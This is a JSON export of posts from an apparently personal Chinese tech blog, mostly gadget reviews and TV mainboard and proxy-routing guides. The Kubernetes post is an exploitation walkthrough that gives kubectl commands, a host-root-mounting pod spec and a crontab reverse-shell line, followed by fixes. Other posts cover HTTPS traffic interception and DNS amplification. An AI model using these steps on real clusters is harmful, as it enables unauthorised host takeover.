{"posts":[{"title":"Android TV Netflix 加载卡顿问题","content":"家里孩子在电视上看 Netflix 儿童节目的时候，经常出现加载进度卡在25%，需等待较长时间才能正常播放。分析之后，发现问题根源在于电视端的 Netflix 会用内置的 DNS 解析找到离你最近区域的节点，但如果你的代理规则中的IP覆盖不全，地域节点匹配不准的话，就会导致流量无法高效分流到代理节点，引发加载缓慢。 后来在网上找到了 Netflix 官方的 GitHub 项目，提供了他们的IP地理数据（nflx-geofeed），根据这个项目结合自己的代理节点，可以定制精准分流规则，解决加载卡顿问题。 一、第三方规则为何导致Netflix卡顿？ 规则更新滞后 第三方规则集（如Dler cloud、ACL4SSR、lhie1等）通常采用通用域名匹配模式，规则一般不会变化，导致 Netflix 部分 IP 未走代理通道。 地域匹配不准 默认规则不会根据你的代理 IP 匹配划分，如果你的分流使用的是香港节点，但规则没匹配香港的IP就会导致速度变慢，触发区域检测机制而引发缓冲。 二、解决方案：基于nflx-geofeed的精准规则定制 Netflix官方维护的nflx-geofeed项目提供了全球各地区服务器IP的地理标签数据。我们可以根据自己的实际代理情况制定精细化规则。 步骤1：提取目标区域数据 以香港节点为例： 访问nflx-geofeed仓库，下载nflx-geofeed.csv文件。 使用文本工具筛选包含HK（香港）标签的IP段。例如：103.116.204.0/22,HK,,Netflix 步骤2：构建OpenClash规则文件 IP段规则 根据Clash语法使用IP-CIDR创建规则。例如：- IP-CIDR,103.116.204.0/22,Netflix-HK,no-resolve 步骤3：在OpenClash中导入规则 覆写规则优先执行 进入OpenClash的覆写设置 → 规则设置，启用自定义规则并粘贴规则内容。覆写规则的优先级高于订阅规则，确保精准匹配。或者在配置管理 → 编辑规则中直接将规则添加到你正在使用的配置文件中。 四、效果验证与对比 把 IP 规则添加之后，如果你的分流代理速度给力，基本上就能做到秒加载了，你也可以直接用我做好的规则，NetflixRule，规则里包含了域名以及香港、新加坡、台湾、日本的 IP 集，有需要的可以拉取配置文件自己去维护，规则不仅适用于Android TV，也适用于其他设备。 ","link":"https://brick713.github.io/GMe_DXnbBk/"},{"title":"Retroid Pocket3+ 开源掌机","content":" 购买渠道：闲鱼 入手价格：580 ‎ 自从苹果调整了 App Store 对经典游戏模拟器的限制之后，‎一些火热的模拟器得以重新上架 App Store，但是个人在体验过了之后发现虚拟按键的形式玩一些老游戏体验实在有点差，于是打算淘一个开源掌机，在做了一些功课之后选在了机遇 Android 系统的 Retroid Pocket3+，体验下来基本符合自己的期望。 虽然东西购买自闲鱼，但是上一代主人还是非常爱惜设备的，整个成色非常好，没有什么包浆，而且前一任主人还自费升级了一些配件，替换了导电胶的十字键，加上霍尔摇杆，让机器按键质感有了保障，日常玩一些格斗类游戏，手指也更加舒适，不容易疲劳。 Retroid Pocket3+ 的外壳材质是塑料的，但不是那种廉价塑料，因此手感很不错，有一点亲肤材质的感觉。体型上比较像小一号的 Switch，重量 235 克，比较适中，双手握持舒适，长时间游戏也不会感觉坠手。显示屏采用的是 iPhone 同规格的 4.7 英寸 LCD 屏幕，对于长期使用 iPhone 的笔者来说，显示效果上挑不出什么毛病，没有不适感。 Retroid Pocket3+ 支持 TF 卡扩容，有先进的 3.5 毫米耳机孔，底部双扬声器，而且采用的是 USB Type-C 接口，可以说在接口上是非常现代了，不过虽然是双扬声器，但实际的音效很一般，而且扬声器在底部，容易被握持遮挡，效果就又要打折扣。Retroid Pocket3+ 顶部还有MicroHDMI接口，可以输出 720P 画质到显示器上，获得更好的游戏体验。 开源掌机最重要的还是游戏体验，Retroid Pocket3+，操作系统是基于 Android 11 定制的，做了横版操作的优化，可以通过按键和触碰进行操作，几乎没有学习成本，很容易上手。Retroid Pocket3+ 也做了一个自己的掌机桌面（前端），进入之后会展示所有的模拟器，界面也非常的美观，只要安装了对应的模拟器，导入游戏后，就可以开始进行同年的回忆了。 除了 Retroid Pocket3+ 自带的掌机桌面，还有第三方的游戏前端桌面，在开源掌机圈比较有名的有大水杯、天马、ES-DE等等，这些游戏桌面也有很多大神做好了游戏整合包和详细的教程，只要按照教程操作就可以轻松配置好模拟器，并且获得海量的游戏，需要的同学可以自行去 B 站找到相关的教程视频。开源掌机的乐趣之一也在于此，不停的折腾界面和内容，就像中年男人折腾 NAS 一样。 本人拿到掌机这段时间已经重温了不少儿时的经典游戏，像重装机兵、炎龙骑士团、仙剑奇侠传、超级机器人大战，对我来说这台开源掌机我个人是十分满意，而且现在的开源掌机圈也是非常的热闹，有非常多的新机器源源不断，期待新人的加入，不过还是要理性购物避免被割韭菜，毕竟开源掌机的硬件性能都很一般，售价相对虚高，还是要根据自己的需求理性消费。 ","link":"https://brick713.github.io/TwUjpmp7L/"},{"title":"米家全能扫拖机器人1s","content":" 购买渠道：淘宝 入手价格：2999 自从家里有孩子之后，打扫家里卫生的时间和精力就越来越少，加上家中的「领导」对环境卫生有苛刻的要求，之前的米家扫拖机器人1c已经不能满足她的要求了，因此购买一台扫拖一体机器人保持家庭卫生就提上了议程。经过多方对比之后最终选择了米家全能扫拖机器人1S，在使用了近1个月之后，可以聊聊它究竟如何了。 米家全能扫拖机器人1S的配件很简单，除了常规的刷头、拖布头之外，还赠送了一瓶清洁剂，根据操作说明进行安装并连接上米家App后，就可以使用了。如果你像我一样已经是米家的长期用户了，那么整个过程几乎没有任何难度，这也是米家一贯的作风了，简单易用。 经过这一段时间的使用，我觉得它的优缺点都很明显，先从优点开始说起。 首先要说的就是清洁能力，4000Pa的吸力加上旋转式的拖头，在扫拖清洁性上得到了家里「领导」的认可，除了一些清扫死角和极其顽固的污渍之外，可以将我家里90%的区域打扫干净，而且拖地后遗留的水痕也较轻，不会影响瓷砖和地板的观感，因此清洁能力可以给到90分。 第二优点就是它的避障建图能力，我在它第一次扫拖地时候全程跟踪，除了因为高度问题它无法进入电视柜底部，没有发生过一次「愚蠢碰撞」，精准的避开了家里的宠物🐈‍和乱窜的小孩，可见双线激光探测加AI视觉识别避障还是有非常好的效果。一次完整扫拖后，它就准确的完成了建图，并且针对我家里的区域进行了非常准确的识别，前任米家扫拖机器人1c比需要多次清扫才能完成建图，而且因为依靠的是纯视觉系统，经常会在家里乱撞。 其次就是它强大的智能化功能，依托米家生态和它精准的建图，我可以完美的利用小爱同学对它进行智能化的控制。例如当我们一家出门玩耍的时候，我会让它开启强力清洁加高水位模式，给家里来一次深度打扫，既可以规避清扫的噪音，又能合理利用时间。依托它的建图，我也可以根据需求让它对单独区域进行清扫，比如小孩子在餐厅吃完饭之后，单独清扫餐厅瓷砖的污渍；洗完澡之后，单独清扫浴室的头发等等。 最后一个优点就是它的体积和性价比，米家作为价格屠夫，在同等价位同等功能上几乎没有对手，定位相似的石头G10s和追觅s10，在功能上和米家全能扫拖机器人1s互有胜负，但是价格上都贵出不少。另外，因为我需要把它摆放在沙发和阳台墙中间，它「高瘦」的体积可以帮我节约更多的空间，配合它的高度，顶部还能临时作为放置物品的空间，这一点上偏「矮胖」的石头G10s在我的使用场景上就稍逊一筹。 同样米家全能扫拖机器人1s也有几个缺点，不得不提。 第一个就是它自带的语音操控功能，设计上是为了让你可以通过语音控制它对你站立的区域进行打扫，或者语音控制它的工作状态。但因为我把它摆放在客厅，它经常会和我客厅的小爱音箱冲突，有时候我在呼叫音箱的时候它莫名其妙就出仓开始工作，即使我开启了小爱同学的就近唤醒，但因为位置上它过于靠近小爱音箱，还是会产生误操作，最终不得已我关闭机器人上的语音控制功能。 第二个就是它标配的是胶毛混合的刷头，这种类型的刷头非常容易缠绕毛发，作为一个拥有长发「领导」和宠物🐈‍的家庭，每次清理刷头体验都不好，因此强烈建议米家在后续的产品上改用纯硅胶的刷头，虽然这会影响一点它的集尘效果，但是也可以明显改善缠绕毛发的情况，相较之下我还是愿意选择牺牲集尘效果换来清理刷头的轻松。好在还有补救方案，你可以选择购买追觅s10的硅胶刷头和刷头罩进行更换，一次更换永久收益，不过目前追觅s10的硅胶刷头官方都缺货了，不知道是不是大家都去购买的原因。 至于其他方面，比如基站的清扫换水、配件的更换、日常的养护和其他扫拖一体机器人并没有本质上的区别，都处在一个水平线上，没有拉开明显的差距。 如果你和我一样，需要一台省心省力、性价比高、能自动清洗与烘干、未来可拓展自动上下水，且具备良好的智能家居生活新体验的扫拖机器人，那么米家全能扫拖机器人1S，是个不错的选择。 ","link":"https://brick713.github.io/YHx_URn92/"},{"title":"Sony 电视更换新款海外遥控器","content":"众所周知，Sony 国行 J 系列的电视的遥控器是针对中国大陆专门定制的，但是这个定制不仅没有带来良好的用户体验，反而在按键布局、按键反馈、盲操上存在众多不合理的设计，引发大量用户的吐槽，其中就包括罗永浩。 幸好索尼今年除了发布 BRAVIA XR 新系列电视外， 还重新设计了遥控器且国行和海外版的区别仅仅是删除了一些海外流媒体按键，因为此前已经将我的国行 A80J 更换了海外主板，详情见国行 Sony 电视更换主板最详教程，于是我果断买了海外版的新款遥控器搭配我的电视使用。 购买渠道 我是在shopjimmy上购买的 TX-800U，到手大概花了不到 40 刀，送到笔者手上大概花了不到 1 个月时间，现在万能的淘宝上已经有华强北产品了，大概不到 80 RMB，有需求的可以直接华强北买即可，不必再从海外采购，浪费时间和金钱。 需要注意的是，海外款的遥控器型号有两种，分别是 TX-800U 和 TX-900U，对应 Sony Mini-LED 和 Oled 两个系列的电视，两款遥控器还是有些区别的，TX-900U 材质上是金属拉丝、有背光按键、支持蜂鸣查找且其中一个流媒体按键是 Bravia Core 没有 Youtube 按键。具体购买那款，可以根据自己的需求来选择。 使用体验 第一次使用，需要先配对遥控器。首先在电视的设置主页中，找到遥控器配对选项，按照电视机显示步骤配对，长按遥控器上语音和音量键按键，待遥控器指示灯闪烁之后松开手，等到电视显示配对完成即可。配对完成后才能正常使用语音助手按键。 配对完成后，就可以正常使用遥控器上的所有功能了，因为我的电视已经更换了海外主板，所有流媒体按键都可以正常唤醒对应的软件，语音功能也正常。新的遥控器的按键反馈也远远强于老款，不同按键的大小和分布区域也更方便用户进行操作，在使用了不到半天我已经可以很熟练的盲操了。老款的遥控器已经可以丢到抽屉里吃灰了。 其他事项 因为我仅针对 A80J 进行了兼容性测试，如果你使用的是更老一些的 Sony 电视，这里不保证能完全兼容，但是看到Chiphell上提到，16年之后的电视都可以使用，有需求的可以购买国内款（TX-800X/900X）尝试一下。 ","link":"https://brick713.github.io/Ce3DnY6bq/"},{"title":"国行 Sony 电视更换主板最详教程","content":"去年双十一的时候家里添置了一台 Sony 电视，完成了一个索粉的信仰充值。在购买之前就了解到国行的 Sony 电视的系统是基于国内用户的特别定制版，在服务和 UI 上都和海外的电视有很大的不同，并且是硬件层面的定制，是无法通过刷固件切换区域这种方式来获得完整的体验。作为一个强迫症加完美主义者，在了解到可以通过更换主板的方式获得完整的服务时，于是就有了这篇文章，有了这次折腾。 前因 之所以会有这次更换主板的想法，主要原因如下： 电视盒子如果没有完整的「杜比全家桶」就浪费了电视的效果，且盒子和电视部分场景下的切换使用，偶尔让人觉得抓狂； 国行的电视系统没有完整的生态。虽然也有诸如当贝市场、沙发管家、Emoton store 这些第三方市场可供使用，但是生态是割裂的，应用内容也远远不够 UI 界面无法接受。充斥各种广告，无效信息和强制安装应用的瀑布式界面，对于我这样的信息洁癖来说，实在无法忍受 重要服务的缺失。Chromecast、Homekit、Airplay、GMS服务的缺失，让电视的功能大打折扣，虽然可以用其他方案替代，效果始终不理想 系统、功能、安全补丁更新缓慢。因为定制的原因，导致一些与Google TV同步的系统更新缓慢，总是要缺失很多本来属于用户的功能更新 基于这些原因，我开始了更换主板之旅，可能有人会问，为什么不买一个电视盒子，比如 Apple TV？因为电视本身的 Google TV 系统就可以带来媲美甚至超越电视盒子的体验了。 更换流程 购买主板 首先我们需要购买海外的电视主板，大家可以在下面几家美国的电子零件供应商购买主板： tvpartstoday tvpartsguy shopjimmy 我最后选择了 tvpartstoday 购买主板，这是一家来印第安纳州的电子零件供应商，除了主板之外还包括屏幕、驱动、背板、电源等等。你可以直接搜索你的电视型号，然后购买对应的主板，比如我的电视是型号是 XR-77A80J，直接搜索对应型号即可。 tvpartstoday 的购买流程并不复杂，注册账号并补充相关信息就好，稍微有一点海淘经验即可完成，我们可以使用 PayPal 或者信用卡进行结算，购买完成后就可以耐心的等待商家将主板寄给你。 准备工具 主板到货之后，tvpartstoday 还会附赠一个简易的说明书，根据他的提醒我们最好提前准备一个 U 盘，并提前在 Sony 的官网中下载固件，在更换完主板后进行手动更新。 我在更换主板的时候，成功一次点亮，并没有手动升级固件，而是配置完电视之后在线更新了系统，但是为了以防万一，这里还是推荐大家预先下载好自己电视对应的海外固件 除此之外，因为海外的主板相比国行主板多两个音频口，具体的位置可能根据不同的型号略有不同，因此我们还需要准备一个电钻进行打孔，孔径大概是7MM的大小，当然为了保证拆卸的顺利我们也可以提前准备好金属卡尺或者拆机片拆卸电视后盖。 当然如果你的动手能力较差或者和我一样电视尺寸过大，无法一个人完成拆卸的话，那么我建议你和我一样选择直接与本地的 Sony 售后人员联系，让 Sony 的工程师上门帮你进行更换，这样能最大程度的减少悲剧的发生，并且你的设备能得到最大程度的保护，当然 Sony 是需要收取一定的人工费用的，这里你可以对照服务费用)综合考虑是否需要这样的服务。 总结下来我们需要提前准备好： 足够容量的 U盘 对应型号的海外固件 7MM 钻头的电钻 拆机片 与本地 Sony 售后工程师沟通 注意事项 这里再补充一些更换过程中需要注意的事项以及事后我获得的一些信息提前告知一下大家，方便小伙伴们做最后的决策，是否有一些自己不能接受的事情。 保修和售后 作者坐标武汉，有非常方便的 Sony 售后，并且上门的工程师也非常的专业靠谱，如果你所在的区域没有比较健全的服务，那么大概率需要自己动手更换了。我的主板在付费更换完毕后，Sony 的工程师明确表示并不会影响我的电视的一年的整机保修和三年主要部件保修。师傅只是叮嘱我保留原主板，如果出现问题可以联系他们再次进行维修更换，至于不同地区是否有不同的政策，作者不得而知，但是无论如何，更换下来的主板一定要好好保存。 海外主板的来源 目前来看，购买的海外主板，有比较大的概率不属于 Sony 工厂原件的而是拆机件，因此 Sony 的工程师是无法将你设备原有的序列号录入到海外主板中的，只有工厂模式主板可以将序列号也就是你机身号码进行录入。上门的 Sony 工程师在进行这个操作的时候发现主板已经有了序列号也有了主板型号，但这并不影响主板本身的使用和功能，大家可以不必担心。 有线电视功能可能有影响 因为是海外主板，因此有线电视的功能会与国内的有线电视传输协议上可能存在一定的偏差，如果你有使用有线电视的需求，那么需要慎重考虑一下换主板是否有必要了。这里作者因为没有亲自测试过是否有影响，但是网络上有反馈可能会出现无法使用的情况，因此还是提醒一下大家风险，但要注意的是运营商的 IPTV 电视服务是不受任何影响的！ 部分国行电视功能丧失 更换完主板后，有一些专门针对国行电视的功能就会彻底消失了，比如内置的电视应用商城、电视自带优惠活动的兑换、针对国内用户的电视会员优惠、国内流媒体的一些会员优惠。除此之外，遥控器上的流媒体快捷键也会提示找不到 App，因为内置的腾讯视频在海外系统不是内置安装的。 激活电视的网络需求 更换了主板后，电视的部分功能需要有流畅的网络方可使用，在刚开始激活电视时，因为 NTP 服务器的原因，WIFI 可能存在实际已连上但是不能联网的情况，这里进入系统设置里手动修改时间后即可解决，也可以后续通过进入开发者模式后，使用 ADB 命令修改 NTP 服务器同步地址来解决 如果上述的一些事项你看过之后和作者一样都能接受，那么你就可以大胆的更换主板了。 更换激活 如果你是自己更换，在断电之后，我们首先需要拆卸电视背板，不同的电视型号的背板大同小异。机身和背板主要通过卡扣连接，在卸掉固定背板的螺丝之后，需要使用拆机片或者金属卡尺慢撬开连接的卡口，这一步需要小心一点，避免撬断卡扣。成功打开背板之后，整个机身大概是这样 卸掉固定主板的螺丝，并小心拆卸掉上面的排线，取下主板即可，这里别忘了对主板的挡板进行开口，前面提到过，海外的主板有多的音频接口。之后就是重新插上排线，并且固定好主板，大家也可以去B站和油管上搜索一下拆解更换视频，也许能找到对应的电视型号，跟着视频拆解会更有信心一些。 更换完毕后，别着急立刻装好背板，先通电开机，看看是否能正常点亮，当我们能看到下面的画面的时候，证明一切顺利，可以放心的还原电视了！ 我们可以选择使用 Google TV 或者 Base TV 模式，这里后续的设置可以根据你的实际使用情况来选择，相信能完成前面所有工作的小伙伴，后续设置上应该不会有太多困难了，唯一要提的是初次使用和激活 HomeKit 和 AirPlay2 功能时，全过程需要联网激活，你需要一个可用的海外代理，否则会一直提示 HomeKit 连接密码错误。 当你正常接入 Homekit 之后，你就可以通过 Siri 控制电视的开关，包括使用 iPhone 虚拟遥控器控制电视了。 最后一步，我们还需要把校色数据导入到主板中，我们要在工厂模式（ service mode ）下，选择显示面板设定（ Panel/PQ ）——色彩参数传输（ WB/Mura/CUC data transfer ）——勾选三个参数——选择 T-con-&gt;SoC 然后执行（ Start ）。这里执行完之后，不会有界面上的反馈，我们需要直接断电让配置生效。这里是 Sony 的工程师告知我的，具体原因不详，既然工程师这么说了，照做即可。SONY 电视出厂是校色过的，色彩文件一式两份主板驱动版上各一份，可以导入导出至对方，只要不是驱动板和主板一起损坏，文件不会丢，所以至少要保证一个板子没换过才能保留色彩文件。 至于如何进入工厂模式（ service mode ），有两种方式： 首先激活电视的开发者模式，激活方式和所有 Android 设备，在设备信息中连续点击版本号即可，之后进入开发者模式选项，开启 ADB 调试，然后就可以在同一个局域网中使用其他设备连接你的电视了。输入 ADB 命令 am start -a com.sony.dtv.intent.action.SELF_DIAG_MODE 即可进入工厂模式。 通过遥控器进入，自带的原厂遥控器是不可以的，我们需要购买工程遥控器，型号为 TX210C，可以在淘宝上自行购买。使用工程遥控器，在电视关机的情况下，依次按下⌈5⌋【音量减】【开机】，即可进入工厂模式。 到此，我们所有工作就做完了，下面就可以真正的完整的享受 Sony 电视的全部功能了！ 系统体验 更换主板完成好配置之后，我们就可以体验 Google TV 了，界面上再也没有国内冗杂烦人的广告，界面的操作逻辑也更合理。 如果你的 IP 地址和你的 Google 账号区域相对应，电视也会给你推荐相应的内容，我们也可以自己管理在主界面上需要展示的流媒体推荐内容，主流的 Disney +、Apple TV、Prime Video、Hulu 都是支持的，但是缺失了 Netflix，希望 Google 能赶紧补全。 当然最重要的收益就是，我们可以获得完整的 Google 生态，我们可以同步我们的 Google 生态下所有的服务，比如我是 YouTube Premium 的会员，我可以在电视上享受完整的服务内容，不再需要使用第三方的 YouTube 应用，我可以方便的通过 Web 端端 Google Play Store 下载和管理我的电视应用。 我们也可以方便的同步我账号的密码，不再需要用遥控器傻傻的进行输入。 同样也可以用上更加智能，且与生态结合的更紧密的 Google Assistant，你可以用它结合 Google 强大的搜索能力，得到几乎最精准的内容，而且支持中文！ 我们可以彻底告别基于 Android TV 的电视盒子，因为盒子有的功能，电视全部都可以实现，而且 Sony 电视对杜比音效、杜比全景声、杜比视界等声音特效的支持也远强于普通的电视盒子，至于其他的功能，这里就不再做赘述，大家可以自己去慢慢发觉，就不在此展开了。 瑕疵&amp;建议 文章的最后其实还有两个谈不上问题的小瑕疵，希望之后能够解决，第一个就是，Google TV 的 UI 界面的流畅感远远比不上 Apple TV 4k，后者在遥控器反应、系统流畅度、UI 动画上依旧是最高水平，Android 生态还有非常大的追赶空间。如果你觉得界面有卡顿感，我建议你和我一样在开发者模式中，把所有的动画时间都设置为 x2 能够极大的改善体验。 另外一个瑕疵就是国行 Sony 的遥控器实在是太太太难用了。很难想象这是 Sony 设计出来的产品，没有背光，按键过于小，导致无法盲操，键位的设计也极度的不合理。这点罗永浩也在微博上吐槽过了，好在 Sony 自己也发现了问题，在新的 K 系列产品中给出了新款遥控器，可以说是全方位的升级了遥控体验，建议大家有条件可以等一等买海外的版本。 那么更换主板这件事适合那些人群呢？首先需要具有爱折腾的心且能从中获得快乐的人，其次就是不想外接一个电视盒子，即使电视盒子基本上能解决80%的问题，然后还得有一些完美主义癖好，想要不断去完善自己的生活质量，最后就是具备一定的动手能力和耐心，如果上述条件你都满足，那么立刻动手吧，整个的成本在不依赖外人帮助的情况下和购买一个电视盒子的花费相差无几。 尾巴 因为疫情和等待配件的原因，从获得主板到真正完成更换再到完成所有的设置，踩过了大大小小不少坑。比如最开始我这款电视在 tvpartstoday 并没有货，等了很久才有我这个型号的主板，再到朋友从国外帮我人肉带回来主板，到它完成了整个的隔离周期后，才把主板交到我手上，在疫情肆虐的今天，过去成熟的海淘也变得困难重重。但是在付出了大量的时间和精力之后，收获的回报也更让人感到满足，或许这就是折腾的快乐吧。 最后感谢整个过程中所有帮助到我的人： 我的好朋友Timon Peng V2EX上的朋友 Sony 工程师的尽职尽责的解答 感谢🙏 ","link":"https://brick713.github.io/y2xp0QCF1/"},{"title":"移动端安全修炼（三）","content":"起因 Android 7.0 之后 Google 默认不信任 User 域下的证书，也就是自行导入证书的方式去抓 HTTPS 包的方法已经不管用了，再加上现在大部分 App 都使用了 SSL Pinning，因此抓包的难度也比之前大了不少。此时再想抓 HTTPS 的流量就要用别的方法了。 如果你够强直接逆向了 App，然后在应用的证书信任的配置文件里添加上你的证书，那么你还是可以抓取这个 App 的流量的，但是这种方法工作量太大，针对不同的应用你还需要一个个逆向文件，成本实在太高。这里讲的方法还是相对省事省时间的方法。通过获取手机 Root 权限，将 BurpSuite 的证书导入系统域中，这样系统就会信任你的证书，达到抓取所有 App 流量的目的了。 方法 在进行之前确保你有以下的条件： 一部获取了 Root 权限的手机 电脑有 OpenSSL 环境 如果你有了上面的条件，下面开始开始操作 从 Brupsuit 中导出证书文件 cacert.der 将 Der 的证书转换为 PEM 格式 openssl x509 -in cacert.der -inform DER -out cacert.pem -outform PEM 获取证书的 hash openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1 记住输出的hash，例如 '9a5ba575' 将证书内容输出到新文件中，文件名称格式为为刚刚输出的 hash + .0， cat cacert.pem &gt; 9a5ba575.0 将证书内容格式化后追加到刚刚生成的文件中，openssl x509 -inform PEM -text -in cacert.pem -out /dev/null &gt;&gt; 9a5ba575.0 将文件传入手机中adb push 9a5ba575.0 /system/etc/security/cacerts/ 使用 ADB 连接手机，执行 adb shell 切换到 Root 权限，然后挂载/system, mount -o rw,remount /system，给你的证书文件加上权限 chmod 644 /system/etc/security/cacerts/9a5ba575.0 重启手机，查看证书是否安装完成 重启手机之后，可以去你的证书目录中查看下证书是否正常导入了，下面是正常的的状态。 尾声 除了导入证书，也有其他的方法来解决这个问题，比如通过 Xposed 插件的方法来实现抓包 如何使用Xposed+JustTrustMe来突破SSL Pinning 或者通过虚拟环境的的方式来抓包，比如使用 HttpCanary，好处是不需要 Root 你的手机 手机抓包+注入黑科技HttpCanary——最强大的Android抓包注入工具 你可以根据自己的实际情况来选择方案。 ","link":"https://brick713.github.io/yi-dong-duan-an-quan-xiu-lian-san/"},{"title":"Kubernetes Api Server 未授权访问漏洞","content":"0x00 漏洞原因 Kubernetes 的服务在正常启动后会开启两个端口： Localhost Port （默认8080） Secure Port （默认6443） 这两个端口都是提供 Api Server 服务的，一个可以直接通过 Web 访问，另一个可以通过 kubectl 客户端进行调用。 正常情况下 Api Server 是有权限控制的，分三种： Authentication Authorization AdmissionControl 如果运维人员没有合理的配置验证和权限，那么攻击者就可以通过这两个接口去获取容器的权限，甚至通过创建自定义的容器去获取宿主机的权限。 0x01 漏洞利用 利用方式按严重程度来说分两种，一种是直接通过利用 kubectl 客户端调用 Secure Port 接口去控制已经创建好的容器。另外一种利用方法就是通过创建一个自定义的容器将系统根目录的文件挂在到/mnt目录，通过修改/mnt/etc/crontab 来影响宿主机的 crontab，获取一个反弹 Shell 拿到宿主机的权限。先说第一种方式。 首先，通过下面命令，去发现已经存在的容器 kubectl -s ip:port get pods 然后直接连接这个容器获取 Shell。 kubectl -s ip:port --namespace=default exec -it dockername bash 这样就达到了控制容器的目的，但是容器的权限本身是不稳定的，如果宿主机本身的内核有问题的话，可以利用脏牛漏洞进行提权，获取宿主机的权限。具体可以参考： PoC for Dirty COW (CVE-2016-5195) DDirtycow-docker-vdso 第二种方式就比较厉害了，利用成功后造成的危害也最大。 首先我们根据官方的规范新建一个标准文件 myapp.yaml ,当然也可以使用 json 格式的。 apiVersion: v1 kind: Pod metadata: name: myapp spec: containers: - image: nginx name: container volumeMounts: - mountPath: /mnt name: test-volume volumes: - name: test-volume hostPath: path: / 其中的 image 可以更换，最好使用基础镜像。 然后我们可以通过两种方式提交我们创建容器的请求，一种是通过他的 Web 页面（也就是默认的8080端口） 另外我们也可以通过他的另外的接口，通过 kubectl 客户端进行任务的提交。 kubectl -s ip:port create -f yourfile 这里如果出现Error from server (NotFound): the server could not find the requested resource报错，可能是因为你的 kubectl 客户端和 kubernetes 的 server 端版本不相同导致的，一定要确保版本相同。 提交成功后，我们用之前命令获取容器的 bash，然后向容器的 /mnt/etc/crontab 写入反弹 shell 的定时任务，因为创建容器时把宿主机的根目录挂载到了容器的/mnt 目录下，所以可以直接影响到宿主机的 crontab。 echo -e &quot;* * * * * root bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\\n&quot; &gt;&gt; /mnt/etc/crontab 接下来就是见证奇迹的时刻，耐心的等待你就能拿到 Shell 了，验证之后可以确认是宿主机的权限，而不是容器的权限 0x01 漏洞修复 在使用 kubernetes 的时候我们一定要进行身份的校验，K8S 的 APi 其实有非常严格的认证和授权 最简单的是在 Authentication 增加静态的 password，或者 token，可以的话关闭 Web 端口的服务，保持最小化原则，避免安全风险的产生，可以参考 官方文档 ","link":"https://brick713.github.io/kubernetes-api-server-wei-shou-quan-fang-wen-lou-dong/"},{"title":"移动端安全修炼（二）","content":"前因 iOS针对IAP有一个保护机制，如果使用了全局代理的方式，iOS检查到之后为了保障交易的安全性，将会拒绝IAP流程，所以是无法抓取交易数据的，以豆瓣阅读为例，未开启代理时，可以正常的进入IAP充值界面，开启代理后则会报错： 但是如果使用的动态代理的模式，可以绕过iOS的检查机制，下面就介绍下具体方法（PS：在这之前，默认你已经按之前的方法将证书倒入了iPhone设备中，教程地址：移动端安全修炼（一））。 这里需要补充一点，新版的iOS在信任证书环节需要新增一个信任，否则无法完全抓取HTTPS数据，具体位置在「设置」—「关于手机」—「信任证书设置」，如图所示： 方法 先准备一个PAC文件（PAC，一个自动代理配置脚本，包含了很多使用 JavaScript 编写的规则，它能够决定网络流量走默认通道还是代理服务器通道，控制的流量类型包括：HTTP、HTTPS 和 FTP）。内容很简单： function FindProxyForURL(url, host) { if(shExpMatch(url,&quot;*.douban.com/*&quot;)){ return &quot;PROXY 192.168.1.134:8088&quot;; } } 这个PAC的意思是域名douban.com使用192.168.1.134:8088进行代理，保存文件为test.pac之后，需要开启一个Web服务器提供这个PAC文件的地址，这里使用Python默认的模块来开一个简单的HTTP服务，到你保存的PAC路径使用如下命令：sudo python -m SimpleHTTPServer 9527 ，这样在你自己本机的IP地址下，就启动了一个Web服务，之后将iOS的WI-FI网络配置你的代理PAC如下： 开启你的抓包软件，抓取你设定好的IP和端口的数据，打开豆瓣阅读进行正常的充值业务，发现不在报错而且可以抓取IAP支付流程的包了，这样就可做交易数据的安全分析了，设定和抓包详情如下： 尾巴 使用该方法抓包，还是需要设备信任抓包工具的证书不管是Charles还是Burp Suite，基于HTTPS的流量抓包，证书是必备的，只不过使用动态代理的方式绕过了检查机制从而获取了想要的数据。 ","link":"https://brick713.github.io/yi-dong-duan-an-quan-xiu-lian-er/"},{"title":"浅析DNS反射放大攻击","content":"DNS反射放大攻击分析 前阵子业务上碰到了DDOS攻击，正好是DNS反射型的，之前只是听过，没自己处理过，仔细学习了一番之后做点记录。 简介 DNS反射放大攻击主要是利用DNS回复包比请求包大的特点，放大流量，伪造请求包的源IP地址为受害者IP，将应答包的流量引入受害的服务器。 简单对比下正常的DNS查询和攻击者的攻击方式： 正常DNS查询： 源IP地址 -----DNS查询----&gt; DNS服务器 -----DNS回复包----&gt; 源IP地址 DNS攻击： 伪造IP地址 -----DNS查询----&gt; DNS服务器 -----DNS回复包----&gt; 伪造的IP地址（攻击目标） 分析 从服务器上抓了一些攻击包，根据这些数据包可以来看看这种攻击都是什么特点。 全部是大量的DNS响应请求（Response请求） 通常里面包含一些不存在或者生僻的域名，经过循环查询从而放大DNS流量 会将将 OPT RR 字段中的 UDP 报文大小设置为很大的值（如 4096） 通过这样放大了攻击流量。发送的 DNS 查询请求数据包大小一般为 60 字节左右，而查询返回结果的数据包大小通常为 3000 字节以上，因此，使用该方式进行放大攻击能够达到 50 倍以上的放大效果。 大量的流量都来自正常的DNS服务器 攻击者通过伪造IP向正常的DNS服务器发送这些恶意的查询请求，将流量引入受害者的服务器，受害者查不到攻击者的真实IP 解决方案 如果没有必要可以关闭DNS服务（废话么不是 如果有DNS服务，做好响应限制，DNS服务不应对互联网上的域名解析服务，而只响公司内部网络DNS解析请求 限制DNS响应数据包大小的阈值，直接丢弃超大的响应数据包 尾巴 希望以后不要碰上这种攻击，双休还得加班修复。以上全部！ ","link":"https://brick713.github.io/qian-xi-dns-fan-she-fang-da-gong-ji/"},{"title":"移动端安全修炼（一）","content":"新开一个坑，主要是记录自己学习移动端的一些相关知识。从基础到复杂吧，也不知道能写多少。从最开始的环境开始。 移动端安全和Web差别并不大，也是分为服务端和客户端，只不过客户端换成了一个App，服务端和Web基本一致。因此挖掘服务端端漏洞和Web没有太大差别。重点在于如何挖掘客户端端漏洞，涉及反编译，代码审计，等等。 如果想要开始漏洞挖掘，最基本的还是要一个真实环境，一搬有两种方法，虚拟机和实体机，之前尝试过用虚拟机安装但是坑比较多，暂时放弃了，因为我手上有一台Android和iOS设备，因此暂时使用实体机器进行测试。开始主要针对服务端，那么就要涉及抓包，这里讲下怎么抓包。 这里只讲一种方法，抓包的方式很多，后面也许会补充，我只讲自己用到的。 需要工具： 电脑一台 burpsuite 查看下自己电脑的IP，确保手机和电脑在同一个网络环境下。 然后修改手机的Wi-Fi设置，将代理设置为该IP（以Android和ios为例）： 这样http的流量就会经过你的电脑，接下来需要配置burpsuite 